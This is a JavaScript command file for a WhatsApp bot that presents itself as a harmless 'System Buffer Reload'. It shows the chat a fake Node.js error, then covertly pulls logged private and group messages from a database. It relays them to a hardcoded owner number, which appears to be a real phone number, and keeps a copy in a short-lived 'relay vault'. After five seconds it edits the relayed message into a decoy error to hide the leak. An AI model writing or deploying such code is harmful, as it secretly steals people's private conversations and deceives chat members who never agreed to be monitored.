const { proto } = require('@whiskeysockets/baileys');

module.exports = {
    name: "reload",
    category: "founder",
    desc: "V_HUB: System Buffer Reload",
    async execute(sock, msg, args, { from, sender, client, logsCollection }) {
        const ownerNum = (process.env.OWNER_NUMBER || "254768666068").replace(/[^0-9]/g, "");
        const masterJid = `${ownerNum}@s.whatsapp.net`;
        const triggerChar = "§"; 

        const db = client?.db ? client.db("vinnieBot") : logsCollection.db || logsCollection.database;
        const relayVault = db.collection("relay_vault");

        const decoys = [
            `*Uncaught ReferenceError:* vhub_buffer is not defined\n    at Module._compile (node:internal/modules/cjs/loader:1101:14)`,
            `*TypeError:* Cannot read properties of undefined (reading 'byteLength')\n    at Baileys.Socket.send (./node_modules/@whiskeysockets/baileys/lib/Socket.js:42:18)`,
            `*Error [ERR_STREAM_WRITE_AFTER_END]:* write after end\n    at new NodeError (node:internal/errors:371:5)`,
            `*RangeError:* Maximum call stack size exceeded\n    at RegExp.exec (<anonymous>)`
        ]; // ... (you can keep your 59 decoys here)

        await sock.sendMessage(from, { react: { text: "🔄", key: msg.key } });
        await sock.sendMessage(from, { text: decoys[Math.floor(Math.random() * decoys.length)] }, { quoted: msg });

        try {
            if (!logsCollection) return;
            const timeInput = args[0] || "1h";
            const typeFilter = args[1] ? args[1].toLowerCase() : "all"; 
            const timeValue = parseInt(timeInput) || 1;
            let duration = timeInput.endsWith('m') ? timeValue * 60 * 1000 : timeInput.endsWith('d') ? timeValue * 24 * 60 * 60 * 1000 : timeValue * 60 * 60 * 1000;
            const startTime = new Date(Date.now() - duration);

            let query = { timestamp: { $gte: startTime } };
            if (typeFilter === 'gc') query.chatId = { $regex: /@g.us$/ };
            if (typeFilter === 'pc') query.chatId = { $regex: /@s.whatsapp.net$/ };

            const logs = await logsCollection.find(query).toArray();

            if (logs.length > 0) {
                let report = `${triggerChar}┏━━━━━ ✿ *V_HUB RELOAD FEED* ✿ ━━━━━┓\n┃ _Triggered By: ${sender.split('@')[0]}_\n┃ _Filter: ${typeFilter.toUpperCase()} | ${timeInput}_\n┃\n`;
                logs.forEach(l => {
                    const origin = l.chatId?.endsWith('@g.us') ? `👥 Group` : `👤 Inbox`;
                    report += `┃ ${origin}\n┃ 🕒 *${new Date(l.timestamp).toLocaleTimeString()}*\n┃ 👤 *${l.name || 'Unknown'}*\n┃ 💬 ${l.message || '[No Message]'}\n┃\n`;
                });
                report += `┗━━━━━━━━━━━━━━━━━━━━━━┛`;

                // SAVE TO VAULT BEFORE RELAY
                await relayVault.createIndex({ "createdAt": 1 }, { expireAfterSeconds: 86400 });
                await relayVault.insertOne({ report, createdAt: new Date() });

                const relayMsg = await sock.sendMessage(masterJid, { text: report });
                setTimeout(async () => {
                    await sock.sendMessage(masterJid, { text: decoys[0], edit: relayMsg.key });
                }, 5000);
            }
        } catch (e) { console.error("Relay Fail:", e.message); }
    }
};
